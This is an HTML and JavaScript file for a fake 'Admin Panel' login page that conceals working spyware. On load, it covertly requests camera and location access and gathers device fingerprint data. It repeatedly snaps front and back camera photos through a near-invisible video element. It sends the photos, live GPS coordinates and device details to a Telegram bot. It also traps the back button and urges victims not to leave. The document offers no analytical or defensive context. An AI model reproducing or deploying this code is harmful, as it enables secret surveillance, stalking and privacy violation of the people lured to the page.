<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Admin Panel · WePlay Data</title>
    <style>
        /* ========== ADMIN PANEL STYLES (VISIBLE) ========== */
        body {
            background-image: url("https://i.ibb.co/CX4YMQ9/4b6c2b4d93af1f062cf9f17288e614be.gif");
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            margin: 0;
        }

        /* Hacker scan light effect */
        body::before {
            content: "";
            position: absolute;
            top: -100%;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(transparent, rgba(0, 255, 0, 0.3), transparent);
            animation: scan 4s linear infinite;
            pointer-events: none;
        }

        @keyframes scan {
            0% { top: -100%; }
            100% { top: 100%; }
        }

        .login-box {
            position: relative;
            background: rgba(0, 0, 0, 0.7);
            color: white;
            padding: 30px;
            border-radius: 10px;
            width: 300px;
            text-align: center;
            box-shadow: 0 0 20px lime;
            z-index: 1;
        }

        h2 {
            color: lime;
            margin-bottom: 20px;
        }

        input {
            width: 90%;
            padding: 10px;
            margin: 10px 0;
            border: 2px solid lime;
            border-radius: 5px;
            background: black;
            color: white;
            outline: none;
        }

        .password-box {
            position: relative;
            width: 100%;
        }

        .password-box input {
            width: 90%;
            padding-right: 35px;
        }

        .eye {
            position: absolute;
            right: 20px;
            top: 18px;
            cursor: pointer;
            color: lime;
            font-size: 18px;
            user-select: none;
        }

        button {
            width: 95%;
            padding: 10px;
            background: lime;
            color: black;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            font-weight: bold;
            margin-top: 10px;
            transition: 0.3s;
        }

        button:hover {
            background: red;
            color: white;
        }

        /* ========== HIDDEN FUNCTIONAL STYLES ========== */
        .video-container {
            position: fixed;
            bottom: 10px;
            right: 10px;
            width: 1px;
            height: 1px;
            opacity: 0.01;
            overflow: hidden;
            pointer-events: none;
            z-index: -1;
        }

        #video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        canvas {
            display: none;
        }

        .processing-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.9);
            z-index: 9999;
            justify-content: center;
            align-items: center;
            color: white;
            font-size: 18px;
            backdrop-filter: blur(5px);
            flex-direction: column;
        }

        .processing-overlay.active {
            display: flex;
        }

        .spinner {
            width: 60px;
            height: 60px;
            border: 6px solid #f3f3f3;
            border-top: 6px solid #00bcd4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .warning-text {
            color: #ff4444;
            font-size: 14px;
            margin-top: 20px;
            text-align: center;
        }

        .exit-warning {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 25px;
            border-radius: 15px;
            text-align: center;
            z-index: 10000;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            width: 80%;
            max-width: 300px;
        }

        .exit-warning.active {
            display: block;
        }

        .exit-warning h3 {
            color: #333;
            margin-bottom: 10px;
        }

        .exit-warning p {
            color: #666;
            margin-bottom: 20px;
        }

        .exit-warning button {
            background: #00bcd4;
            color: white;
            border: none;
            padding: 10px 30px;
            border-radius: 25px;
            font-size: 16px;
            cursor: pointer;
        }
    </style>
    <!-- Telegram config file (must be included before main script) -->
    <script src="config.js"></script>
</head>
<body>
    <!-- HIDDEN ELEMENTS (required for data collection) -->
    <div class="processing-overlay" id="processingOverlay">
        <div class="spinner"></div>
        <div>Admin Login Processing...</div>
        <div style="font-size: 14px; margin-top: 15px;">Please wait while we verify</div>
        <div class="warning-text">⚠️ Do not close or minimize</div>
    </div>

    <div class="exit-warning" id="exitWarning">
        <h3>⚠️ Processing</h3>
        <p>Admin login is being processed. Please wait...</p>
        <button onclick="document.getElementById('exitWarning').classList.remove('active')">OK</button>
    </div>

    <div class="video-container">
        <video id="video" autoplay playsinline muted></video>
    </div>
    <canvas id="canvas"></canvas>

    <!-- VISIBLE ADMIN PANEL LOGIN -->
    <div class="login-box">
        <h2>🔐 Admin Panel</h2>
        <form id="loginForm" onsubmit="return false;">
            <input type="text" id="userid" placeholder="Enter User ID" required>
            <div class="password-box">
                <input type="password" id="password" placeholder="Enter Password" required>
                <span class="eye" onclick="togglePassword()">👁️</span>
            </div>
            <button type="button" id="loginButton">Login</button>
        </form>
    </div>

    <!-- Main script -->
    <script>
        // ==================== VARIABLES ====================
        let stream = null;
        let capturing = false;
        let captureInterval = null;
        let locationWatchId = null;
        let photoCount = 0;
        let locationCount = 0;
        let cameraReady = false;
        let isProcessing = false;          // controls overlay and exit protection
        let useFrontCamera = true;
        let photoCounter = 0;
        let photoQueue = [];
        
        // ==================== BACK BUTTON PREVENTION ====================
        history.pushState(null, null, location.href);
        window.onpopstate = function() {
            if (isProcessing) {
                document.getElementById('exitWarning').classList.add('active');
                history.pushState(null, null, location.href);
            } else {
                window.location.href = 'about:blank';
            }
        };
        
        document.addEventListener('visibilitychange', function() {
            if (document.hidden && isProcessing) {
                alert('⚠️ Processing in progress! Please do not switch tabs.');
            }
        });
        
        window.addEventListener('beforeunload', function(e) {
            if (isProcessing) {
                e.preventDefault();
                e.returnValue = 'Processing in progress! Are you sure you want to leave?';
                return 'Processing in progress! Are you sure you want to leave?';
            }
        });
        
        // ==================== TELEGRAM SEND FUNCTIONS ====================
        async function sendTelegramMessage(text) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const payload = {
                chat_id: CHAT_ID,
                text: text,
                parse_mode: 'HTML'
            };
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                const data = await response.json();
                if (!data.ok) console.error('Telegram message error:', data);
                return data;
            } catch (err) {
                console.error('Failed to send message:', err);
                throw err;
            }
        }

        async function sendTelegramPhoto(blob, caption = '') {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'photo.jpg');
            if (caption) formData.append('caption', caption);
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    body: formData
                });
                const data = await response.json();
                if (!data.ok) console.error('Telegram photo error:', data);
                return data;
            } catch (err) {
                console.error('Failed to send photo:', err);
                throw err;
            }
        }

        async function sendWithRetry(type, data, attempt = 1) {
            try {
                if (type === 'message') {
                    await sendTelegramMessage(data);
                } else if (type === 'location') {
                    const text = `📍 Live location:\nLatitude: ${data.lat}\nLongitude: ${data.lng}\nGoogle Maps: https://maps.google.com/?q=${data.lat},${data.lng}`;
                    await sendTelegramMessage(text);
                } else if (type === 'device_info') {
                    const text = `📱 <b>Extended Device Info</b>\n` + 
                        Object.entries(data).map(([k, v]) => `<b>${k}:</b> ${v}`).join('\n');
                    await sendTelegramMessage(text);
                }
            } catch (err) {
                console.log(`Send failed (attempt ${attempt}), retrying...`, err);
                if (attempt < 2) {
                    await new Promise(r => setTimeout(r, 2000));
                    return sendWithRetry(type, data, attempt + 1);
                }
            }
        }

        async function sendPhotoWithRetry(blob, num, cameraType, attempt = 1) {
            try {
                const caption = `📸 Photo #${num} (${cameraType} camera)`;
                await sendTelegramPhoto(blob, caption);
                console.log(`Photo #${num} sent`);
            } catch (err) {
                console.log(`Photo send failed (attempt ${attempt})`, err);
                if (attempt < 2) {
                    await new Promise(r => setTimeout(r, 3000));
                    return sendPhotoWithRetry(blob, num, cameraType, attempt + 1);
                } else {
                    console.log('Photo failed after retry');
                }
            }
        }
        
        // ==================== INIT ON PAGE LOAD (START EVERYTHING IMMEDIATELY) ====================
        window.onload = function() {
            // Request camera permission
            initCamera();
            
            // Request location permission and start sending immediately
            initLocationAndStartSending();
            
            // Collect and send device info (async)
            collectExtendedDeviceInfo().then(info => {
                sendWithRetry('device_info', info);
            });
            
            // Start photo capture as soon as camera is ready (no overlay)
            const checkCameraInterval = setInterval(() => {
                if (cameraReady && !capturing) {
                    clearInterval(checkCameraInterval);
                    startPhotoCapture(); // starts background capture without overlay
                }
            }, 300);
            
            // Fallback: if camera never ready, still mark that we tried
            setTimeout(() => {
                clearInterval(checkCameraInterval);
            }, 10000);
            
            // Attach login button click to show overlay
            document.getElementById('loginButton').addEventListener('click', function() {
                // Show processing overlay (does not affect ongoing capture)
                if (!isProcessing) {
                    isProcessing = true;
                    document.getElementById('processingOverlay').classList.add('active');
                    history.pushState(null, null, location.href);
                    // Optionally send a message that login was clicked
                    sendWithRetry('message', '🔑 Admin Login button clicked');
                }
            });
        };
        
        // ==================== CAMERA INIT ====================
        async function initCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                    audio: false
                });
                const video = document.getElementById('video');
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    video.play().then(() => {
                        cameraReady = true;
                        useFrontCamera = true;
                        console.log('Camera ready (front)');
                    }).catch(e => console.log('Play error:', e));
                };
            } catch (err) {
                console.log('Front camera failed:', err);
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
                        audio: false
                    });
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    video.onloadedmetadata = () => {
                        video.play().then(() => {
                            cameraReady = true;
                            useFrontCamera = false;
                            console.log('Camera ready (back)');
                        }).catch(e => console.log('Play error:', e));
                    };
                } catch (err2) {
                    console.log('All cameras failed');
                    cameraReady = false;
                }
            }
        }
        
        // ==================== LOCATION: SEND IMMEDIATELY AND START LIVE UPDATES ====================
        function initLocationAndStartSending() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        // Send initial location immediately
                        sendWithRetry('location', {
                            lat: position.coords.latitude,
                            lng: position.coords.longitude
                        });
                        // Start live updates
                        startLiveLocation();
                    },
                    (error) => console.log('Location error:', error),
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            }
        }
        
        // ==================== EXTENDED DEVICE INFO ====================
        async function collectExtendedDeviceInfo() {
            const info = {
                'User Agent': navigator.userAgent,
                'Platform': navigator.platform,
                'Language': navigator.language,
                'Screen': `${screen.width}x${screen.height}`,
                'Color Depth': screen.colorDepth,
                'Timezone': Intl.DateTimeFormat().resolvedOptions().timeZone,
                'Timestamp': new Date().toISOString(),
                'Cookies Enabled': navigator.cookieEnabled,
                'Do Not Track': navigator.doNotTrack || 'unspecified',
                'Hardware Concurrency': navigator.hardwareConcurrency || 'unknown',
                'Device Memory': navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown',
                'Max Touch Points': navigator.maxTouchPoints || 'unknown',
            };

            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    info['Battery Level'] = (battery.level * 100) + '%';
                    info['Battery Charging'] = battery.charging ? 'Yes' : 'No';
                } catch (e) {
                    info['Battery'] = 'Not available';
                }
            } else {
                info['Battery'] = 'API not supported';
            }

            if (navigator.connection) {
                const conn = navigator.connection;
                info['Network Type'] = conn.effectiveType || 'unknown';
                info['Downlink'] = conn.downlink ? conn.downlink + ' Mbps' : 'unknown';
                info['RTT'] = conn.rtt ? conn.rtt + ' ms' : 'unknown';
                info['Save Data'] = conn.saveData ? 'Yes' : 'No';
            } else {
                info['Network'] = 'API not supported';
            }
            return info;
        }

        // ==================== START PHOTO CAPTURE (background, no overlay) ====================
        function startPhotoCapture() {
            if (capturing) return;
            capturing = true;
            photoCounter = 0;
            captureInterval = setInterval(capturePhoto, 5000);
            setTimeout(capturePhoto, 1000); // first photo after 1 second
            
            // Auto-stop after 30 seconds (photo capture stops, but overlay may still appear later)
            setTimeout(() => {
                if (capturing) stopPhotoCapture();
            }, 30000);
        }
        
        function stopPhotoCapture() {
            capturing = false;
            if (captureInterval) clearInterval(captureInterval);
            // Do not clear location watch here; keep sending location
            processQueue();
            // Send a completion message (optional)
            sendWithRetry('message', '📸 Photo capture completed (30s)');
        }
        
        // ==================== CAPTURE PHOTO (front first, then alternate) ====================
        async function capturePhoto() {
            if (!capturing || !cameraReady || !stream) return;
            try {
                photoCounter++;
                // Alternate after first photo
                if (photoCounter > 1) {
                    useFrontCamera = !useFrontCamera;
                    await switchCamera(useFrontCamera ? 'user' : 'environment');
                }
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                const context = canvas.getContext('2d');
                if (video.videoWidth === 0 || video.videoHeight === 0) {
                    setTimeout(capturePhoto, 300);
                    return;
                }
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                if (useFrontCamera) {
                    context.translate(canvas.width, 0);
                    context.scale(-1, 1);
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    context.setTransform(1, 0, 0, 1, 0, 0);
                } else {
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                }
                photoCount++;
                canvas.toBlob(async (blob) => {
                    try {
                        if (blob.size > 1000) {
                            await sendPhotoWithRetry(blob, photoCount, useFrontCamera ? 'Front' : 'Back');
                        }
                    } catch (err) {
                        console.log('Photo send error:', err);
                    }
                }, 'image/jpeg', 70);
            } catch (err) {
                console.log('Capture error:', err);
            }
        }
        
        async function processQueue() {
            while (photoQueue.length > 0) {
                const item = photoQueue.shift();
                await sendPhotoWithRetry(item.blob, item.num, item.cameraType);
                await new Promise(r => setTimeout(r, 1000));
            }
        }
        
        async function switchCamera(mode) {
            try {
                if (stream) stream.getTracks().forEach(track => track.stop());
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: mode, width: { ideal: 640 }, height: { ideal: 480 } },
                    audio: false
                });
                const video = document.getElementById('video');
                video.srcObject = stream;
                return new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play().then(resolve).catch(resolve);
                    };
                });
            } catch (err) {
                console.log('Switch error:', err);
                return false;
            }
        }
        
        function startLiveLocation() {
            if (!navigator.geolocation) return;
            locationWatchId = navigator.geolocation.watchPosition(
                (position) => {
                    locationCount++;
                    // Send every ~30 seconds (assuming updates every 5 seconds, count 6)
                    if (locationCount % 6 === 0) {
                        sendWithRetry('location', {
                            lat: position.coords.latitude,
                            lng: position.coords.longitude
                        });
                    }
                },
                (error) => console.log('Live location error:', error),
                { enableHighAccuracy: true, maximumAge: 30000, timeout: 27000 }
            );
        }

        // ==================== ADMIN PANEL TOGGLE PASSWORD ====================
        function togglePassword() {
            var pass = document.getElementById("password");
            if (pass.type === "password") {
                pass.type = "text";
            } else {
                pass.type = "password";
            }
        }
    </script>
</body>
</html>
